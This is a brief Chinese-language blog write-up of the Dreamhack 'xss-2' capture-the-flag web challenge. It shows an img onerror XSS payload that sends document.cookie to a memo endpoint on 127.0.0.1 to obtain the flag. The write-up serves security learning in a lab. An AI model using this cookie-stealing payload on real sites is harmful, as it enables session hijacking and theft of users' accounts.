---
title: "xss-2"
pubDatetime: 2025-02-20T00:00:00Z
description: "Dreamhack"
tags: ["Dreamhack",  "Web"]
parentPost: "dreamhack"
draft: false
---

# xss-2

跟 `xss-1` 的區別在於進入 `/vuln` 之後 `<script>alert(1)</script>` 沒有效果了

![vuln](../../../assets/images/blog/dreamhack/xss-2/image.png)

試試別的 payload

```javascript
<img src="x" onerror="location.href='http://127.0.0.1:8000/memo?memo='+document.cookie;">
```

![flag](../../../assets/images/blog/dreamhack/xss-2/image-1.png)
